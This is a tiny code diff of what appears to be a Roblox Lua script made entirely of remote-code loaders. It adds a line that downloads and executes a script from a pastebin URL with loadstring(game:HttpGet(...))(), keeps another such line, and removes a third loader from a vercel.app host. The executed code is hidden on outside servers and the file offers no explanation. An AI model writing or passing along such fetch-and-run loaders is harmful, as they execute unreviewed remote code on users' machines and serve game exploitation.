@@ -1,3 +1,2 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/XdNt41bc", true))()
 loadstring(game:HttpGet("https://pastebin.com/raw/MhNPh3J7", true))()
-ID = "bdOrmLOo"
-loadstring(game:HttpGet("https://script-lynx.vercel.app/script.lua"))()
